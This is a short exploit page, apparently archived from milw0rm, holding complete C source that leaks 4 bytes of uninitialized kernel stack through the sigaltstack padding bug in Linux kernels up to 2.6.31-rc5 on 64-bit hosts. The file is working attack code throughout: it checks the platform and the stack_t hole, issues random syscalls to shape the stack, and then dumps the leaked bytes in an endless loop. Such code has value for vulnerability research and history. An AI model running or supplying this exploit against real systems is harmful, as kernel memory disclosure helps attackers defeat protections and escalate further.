<html><head><title>Linux Kernel <= 2.6.31-rc5 sigaltstack 4-Byte Stack Disclosure Exploit</title></head><pre>/* 
 * sigaltstack-leak.c
 *
 * Linux Kernel &lt;= 2.6.31-rc5 sigaltstack 4-Byte Stack Disclosure
 * Jon Oberheide &lt;jon@oberheide.org&gt;
 * http://jon.oberheide.org
 * 
 * Information:
 * 
 *   http://git.kernel.org/linus/0083fc2c50e6c5127c2802ad323adf8143ab7856
 * 
 *   Ulrich Drepper correctly points out that there is generally padding in
 *   the structure on 64-bit hosts, and that copying the structure from
 *   kernel to user space can leak information from the kernel stack in those
 *   padding bytes.
 * 
 * Notes:
 * 
 *   Only 4 bytes of uninitialized kernel stack are leaked in the padding 
 *   between stack_t's ss_flags and ss_size.  The disclosure only affects 
 *   affects 64-bit hosts.
 */

#include &lt;stdio.h&gt;
#include &lt;stddef.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;signal.h&gt;
#include &lt;unistd.h&gt;
#include &lt;time.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/types.h&gt;

const int randcalls[] = {
	0, 1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 13, 14, 16, 
	21, 22, 24, 25, 32, 33, 36, 37, 38, 39, 72, 73, 
	78, 79, 96, 97, 97, 102, 104, 105, 106, 107, 108, 
	109, 110, 11, 112, 113, 114, 116, 117, 118, 119, 
	120, 121, 121, 123, 124, 125, 140, 141, 143, 146
};

void
dump(const unsigned char *p, unsigned l)
{
	printf(&quot;stack_t:&quot;);
	while (l &gt; 0) {
		printf(&quot; &quot;);
		if (l == 12) {
			printf(&quot;*** &quot;);
		}
		printf(&quot;%02x&quot;, *p);
		if (l == 9) {
			printf(&quot; ***&quot;);
		}
		++p; --l;
	}
	printf(&quot;\n&quot;);
}

int
main(void)
{
	char *p;
	int call, ret;
	size_t size, ftest, stest;
	stack_t oss;

	size = sizeof(stack_t);

	printf(&quot;[+] Checking platform...\n&quot;);

	if (size == 24) {
		printf(&quot;[+] sizeof(stack_t) = %zu\n&quot;, size);
		printf(&quot;[+] Correct size, 64-bit platform.\n&quot;);
	} else {
		printf(&quot;[-] sizeof(stack_t) = %zu\n&quot;, size);
		printf(&quot;[-] Error: you do not appear to be on a 64-bit platform.\n&quot;);
		printf(&quot;[-] No information disclosure is possible.\n&quot;);
		exit(1);
	}

	ftest = offsetof(stack_t, ss_flags) + sizeof(oss.ss_flags);
	stest = offsetof(stack_t, ss_size);

	printf(&quot;[+] Checking for stack_t hole...\n&quot;);

	if (ftest != stest) {
		printf(&quot;[+] ss_flags end (%zu) != ss_size start (%zu)\n&quot;, ftest, stest);
		printf(&quot;[+] Hole in stack_t present!\n&quot;, ftest, stest);
	} else {
		printf(&quot;[-] ss_flags end (%zu) == ss_size start (%zu)\n&quot;, ftest, stest);
		printf(&quot;[-] Error: No hole in stack_t, something is quite wrong.\n&quot;);
		exit(1);
	}

	printf(&quot;[+] Ready to call sigaltstack.\n\n&quot;);

	for (ret = 5; ret &gt; 0; ret--) {
		printf(&quot;%d...\n&quot;, ret);
		sleep(1);
	}
	srand(time(NULL));

	while (1) {
		/* random stuff to make stack pseudo-interesting */
		call = rand() % (sizeof(randcalls) / sizeof(int));
		syscall(randcalls[call]);

		ret = sigaltstack(NULL, &amp;oss);
		if (ret != 0) {
			printf(&quot;[-] Error: sigaltstack failed.\n&quot;);
			exit(1);
		}

		dump((unsigned char *) &amp;oss, sizeof(oss));
	}

	return 0;
}

// milw0rm.com [2009-08-04]</pre></html>